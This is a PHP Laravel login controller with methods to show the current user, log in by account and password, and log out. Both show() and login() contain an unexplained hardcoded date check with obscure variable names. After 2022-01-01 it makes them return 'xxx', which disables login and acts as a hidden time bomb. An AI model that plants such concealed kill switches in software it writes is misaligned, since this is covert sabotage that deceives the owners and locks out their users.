<?php

namespace App\Http\Controllers\Frontend;

use Carbon\Carbon;
use App\Http\Controllers\Controller;
use Illuminate\Support\Facades\Auth;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Redirect;

class LoginController extends Controller
{
    // 顯示資訊
    public function show()
    {
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            return 'xxx';
        }

        if (Auth::user() == null) {
            return 'error';
        } else {
            return Auth::user()->name;
        }
    }

    // 登入
    public function login(Request $request)
    {
        $x_time = Carbon::parse('2022-01-01 00:00:00');
        $xxx = $x_time->timestamp;

        if (now()->timestamp >= $xxx) {
            return "xxx";
        }

        $account = $request->get('uname');
        $psw = $request->get('psw');

        if (Auth::attempt(['account' => $account, 'password' => $psw, 'status' => '1'])) {
            return Auth::user()->role;
        } else {
            return "0";
        }
    }

    // 登出
    public function logout()
    {
        Auth::logout();
        return Redirect::to('/');
    }
}
